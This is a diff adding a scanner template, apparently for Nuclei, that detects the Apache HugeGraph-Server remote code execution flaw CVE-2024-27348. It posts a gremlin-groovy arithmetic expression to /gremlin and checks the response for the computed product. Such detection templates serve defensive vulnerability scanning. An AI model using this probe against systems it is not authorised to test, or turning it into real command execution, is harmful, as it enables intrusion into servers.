@@ -1,0 +1,35 @@
+id: poc-yaml-hugegraph-remote-command-execution
+info:
+  name: Apache HugeGraph-Server Remote Command Execution (CVE-2024-27348)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce,CVE-2024-27348
+
+variables:
+  t1: "{{rand_int(100,9000)}}"
+  t2: "{{rand_int(100,9000)}}"
+  t3: "{{to_number(t1) * to_number(t2)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/gremlin"
+    headers:
+      Content-Type: application/json
+    body: |-
+      {"gremlin": "{{t1}}*{{t2}}", "bindings": {}, "language": "gremlin-groovy", "aliases": {}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t3}}"
+          - '{"data":'
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
